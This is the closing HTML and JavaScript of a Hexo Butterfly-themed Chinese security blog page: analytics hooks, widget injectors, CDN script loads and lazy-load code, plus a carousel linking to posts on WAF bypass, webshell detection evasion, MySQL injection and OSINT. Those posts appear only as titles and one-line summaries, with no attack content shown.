    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // Analytics
  if (false) {
    MtaH5.pgv()
  }

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_clock_injector_config(){
    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="/img/gif/loading4.gif" data-original="/img/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
    console.log('已挂载butterfly_clock')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_clock_injector_config();
  }
  else if (epage === cpage){
    butterfly_clock_injector_config();
  }
  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.js"></script><script data-pjax>
  function butterfly_swiper_injector_config(){
    var parent_div_git = document.getElementById('recent-posts');
    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/e2e31796.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/yunsuo.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-23</span><a class="blog-slider__title" href="post/e2e31796.html" alt="">WAF-Bypass之SQL注入绕过云锁</a><div class="blog-slider__text">本文主要介绍:如何科学地绕过云锁WAF</div><a class="blog-slider__button" href="post/e2e31796.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/e1e1fb64.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/waf.png" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-14</span><a class="blog-slider__title" href="post/e1e1fb64.html" alt="">WAF-Bypass之WAF介绍与分析</a><div class="blog-slider__text">本文主要介绍:WAF的工作原理以及部署方式</div><a class="blog-slider__button" href="post/e1e1fb64.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/e6a9f884.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/webshell2.png" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-12-23</span><a class="blog-slider__title" href="post/e6a9f884.html" alt="">WebShell检测绕过之下·有的放矢</a><div class="blog-slider__text">本文主要介绍:本文针对国内主流查杀引擎进行分析，通过绕过Source点、Sink点与绕过数据流处理检测对Webshell进行科学免杀</div><a class="blog-slider__button" href="post/e6a9f884.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/c2f49bfa.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/mysql.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-06</span><a class="blog-slider__title" href="post/c2f49bfa.html" alt="">MySQL数据库注入攻击方式</a><div class="blog-slider__text">本文主要介绍:MySQL数据库的注入与提取利用</div><a class="blog-slider__button" href="post/c2f49bfa.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/7544e3e7.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/google.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-05</span><a class="blog-slider__title" href="post/7544e3e7.html" alt="">开源情报与搜索引擎</a><div class="blog-slider__text">本文主要介绍:使用谷歌语法搜索公开信息，利用空间测绘引擎搜索资产，使用Python脚本简单编写被动信息收集的工具</div><a class="blog-slider__button" href="post/7544e3e7.html" alt="">详情   </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
    console.log('已挂载butterfly_swiper')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'undefined'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_swiper_injector_config();
  }
  else if (epage === cpage){
    butterfly_swiper_injector_config();
  }
  </script><script defer src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.1.6/js/swiper.min.js"></script><script defer data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiper_init.js"></script><script defer src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/mindmap.min.js"></script><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --><script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body></html>